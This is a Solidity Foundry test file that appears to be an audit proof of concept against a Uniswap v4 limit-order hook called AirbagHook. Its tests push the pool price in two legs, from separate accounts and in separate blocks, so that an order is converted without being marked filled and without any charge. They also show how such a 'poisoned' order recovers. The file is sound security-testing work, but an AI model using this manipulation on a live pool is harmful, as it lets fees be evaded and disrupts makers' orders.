// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;

import {Test, console2} from "forge-std/Test.sol";
import {Deployers} from "@uniswap/v4-core/test/utils/Deployers.sol";
import {IHooks} from "@uniswap/v4-core/src/interfaces/IHooks.sol";
import {Hooks} from "@uniswap/v4-core/src/libraries/Hooks.sol";
import {IPoolManager} from "@uniswap/v4-core/src/interfaces/IPoolManager.sol";
import {Currency} from "@uniswap/v4-core/src/types/Currency.sol";
import {StateLibrary} from "@uniswap/v4-core/src/libraries/StateLibrary.sol";
import {HookMiner} from "v4-periphery/test/shared/HookMiner.sol";
import {TickMath} from "@uniswap/v4-core/src/libraries/TickMath.sol";
import {SwapParams, ModifyLiquidityParams} from "@uniswap/v4-core/src/types/PoolOperation.sol";
import {PoolSwapTest} from "@uniswap/v4-core/src/test/PoolSwapTest.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

import {AirbagHook} from "../src/AirbagHook.sol";
import {AirbagOrders} from "../src/AirbagOrders.sol";

contract ZzRefutePoC is Test, Deployers {
    using StateLibrary for IPoolManager;

    AirbagHook internal hook;
    address internal maker = address(0xA11CE);

    function setUp() public {
        deployFreshManagerAndRouters();
        (currency0, currency1) = deployMintAndApprove2Currencies();
        uint160 flags =
            uint160(Hooks.BEFORE_SWAP_FLAG | Hooks.AFTER_SWAP_FLAG | Hooks.AFTER_SWAP_RETURNS_DELTA_FLAG);
        (address predicted, bytes32 salt) =
            HookMiner.find(address(this), flags, type(AirbagHook).creationCode, abi.encode(address(manager)));
        hook = new AirbagHook{salt: salt}(manager);
        assertEq(address(hook), predicted);
        (key,) = initPoolAndAddLiquidity(currency0, currency1, IHooks(address(hook)), 500, SQRT_PRICE_1_1);
        modifyLiquidityRouter.modifyLiquidity(
            key,
            ModifyLiquidityParams({tickLower: -6000, tickUpper: 6000, liquidityDelta: 1_000e18, salt: bytes32(0)}),
            ""
        );
        deal(Currency.unwrap(currency0), address(this), 50_000 ether);
        deal(Currency.unwrap(currency1), address(this), 50_000 ether);
        deal(Currency.unwrap(currency0), maker, 1000 ether);
        deal(Currency.unwrap(currency1), maker, 1000 ether);
        vm.startPrank(maker);
        IERC20(Currency.unwrap(currency0)).approve(address(hook), type(uint256).max);
        IERC20(Currency.unwrap(currency1)).approve(address(hook), type(uint256).max);
        vm.stopPrank();
    }

    function _pushTo(int24 targetTick) internal {
        (, int24 cur,,) = manager.getSlot0(key.toId());
        if (targetTick == cur) return;
        bool up = targetTick > cur;
        swapRouter.swap(
            key,
            SwapParams({
                zeroForOne: !up,
                amountSpecified: -5_000 ether,
                sqrtPriceLimitX96: TickMath.getSqrtPriceAtTick(targetTick)
            }),
            PoolSwapTest.TestSettings({takeClaims: false, settleUsingBurn: false}),
            ""
        );
    }

    // Baseline: single-leg cross from below -> charged.
    function test_baseline_singleLeg() public {
        vm.prank(maker);
        uint256 id = hook.createOrder(key, 10, 5e18);
        _pushTo(410);
        AirbagOrders.Order memory o = hook.orderOf(id);
        console2.log("baseline filled", o.filled);
        console2.log("baseline rebate0", o.rebate0);
        console2.log("baseline rebate1", o.rebate1);
        assertTrue(o.filled);
    }

    // Two-leg: leg 1 parks inside [10,20), leg 2 runs far past.
    function test_twoLeg_bypass() public {
        vm.prank(maker);
        uint256 id = hook.createOrder(key, 10, 5e18);
        _pushTo(15);
        (, int24 mid,,) = manager.getSlot0(key.toId());
        console2.log("mid tick", mid);
        AirbagOrders.Order memory m = hook.orderOf(id);
        console2.log("after leg1 filled", m.filled);
        _pushTo(410);
        (, int24 post,,) = manager.getSlot0(key.toId());
        console2.log("post tick", post);
        AirbagOrders.Order memory o = hook.orderOf(id);
        console2.log("after leg2 filled", o.filled);
        console2.log("rebate0", o.rebate0);
        console2.log("rebate1", o.rebate1);

        // claim behaviour
        vm.prank(maker);
        try hook.claimOrder(id, key) {
            console2.log("claimOrder SUCCEEDED");
        } catch (bytes memory reason) {
            console2.logBytes(reason);
            console2.log("claimOrder REVERTED");
        }
    }

    // Falling side control.
    function test_fallingSide_control() public {
        _pushTo(-100);
        vm.prank(maker);
        uint256 id = hook.createOrder(key, -200, 5e18); // range [-200,-190], below market
        _pushTo(-195);
        AirbagOrders.Order memory m = hook.orderOf(id);
        console2.log("falling after leg1 filled", m.filled);
        _pushTo(-600);
        AirbagOrders.Order memory o = hook.orderOf(id);
        console2.log("falling after leg2 filled", o.filled);
        console2.log("falling rebate0", o.rebate0);
        console2.log("falling rebate1", o.rebate1);
    }

    // Different actors for each leg, different blocks: no shared tx.origin, no top-up path.
    function test_twoLeg_bypass_separateActorsAndBlocks() public {
        vm.prank(maker);
        uint256 id = hook.createOrder(key, 10, 5e18);

        address a1 = address(0xB0B);
        address a2 = address(0xCA7);
        deal(Currency.unwrap(currency0), a1, 50_000 ether);
        deal(Currency.unwrap(currency1), a1, 50_000 ether);
        deal(Currency.unwrap(currency0), a2, 50_000 ether);
        deal(Currency.unwrap(currency1), a2, 50_000 ether);
        vm.startPrank(a1, a1);
        IERC20(Currency.unwrap(currency0)).approve(address(swapRouter), type(uint256).max);
        IERC20(Currency.unwrap(currency1)).approve(address(swapRouter), type(uint256).max);
        vm.stopPrank();
        vm.startPrank(a2, a2);
        IERC20(Currency.unwrap(currency0)).approve(address(swapRouter), type(uint256).max);
        IERC20(Currency.unwrap(currency1)).approve(address(swapRouter), type(uint256).max);
        vm.stopPrank();

        vm.prank(a1, a1);
        _pushTo(15);
        vm.roll(block.number + 1);
        vm.prank(a2, a2);
        _pushTo(410);

        AirbagOrders.Order memory o = hook.orderOf(id);
        console2.log("sep filled", o.filled);
        console2.log("sep rebate0", o.rebate0);
        console2.log("sep rebate1", o.rebate1);
        assertFalse(o.filled, "BYPASS: order fully converted but never marked filled");
        assertEq(uint256(o.rebate0) + uint256(o.rebate1), 0, "BYPASS: zero charge");

        // maker principal: recoverable only via cancelOrder
        uint256 b1before = IERC20(Currency.unwrap(currency1)).balanceOf(maker);
        vm.prank(maker);
        hook.cancelOrder(id, key);
        uint256 got1 = IERC20(Currency.unwrap(currency1)).balanceOf(maker) - b1before;
        console2.log("cancel returned currency1", got1);
        assertGt(got1, 0, "position was converted to currency1");
    }

    // Poisoned order unsticks only if price dips back below tickLower and re-crosses.
    function test_poison_unsticks_after_recross() public {
        vm.prank(maker);
        uint256 id = hook.createOrder(key, 10, 5e18);
        _pushTo(15);
        _pushTo(410);
        assertFalse(hook.orderOf(id).filled, "poisoned");
        _pushTo(-20);
        _pushTo(410);
        AirbagOrders.Order memory o = hook.orderOf(id);
        console2.log("after recross filled", o.filled);
        console2.log("after recross rebate0", o.rebate0);
        console2.log("after recross rebate1", o.rebate1);
    }
}
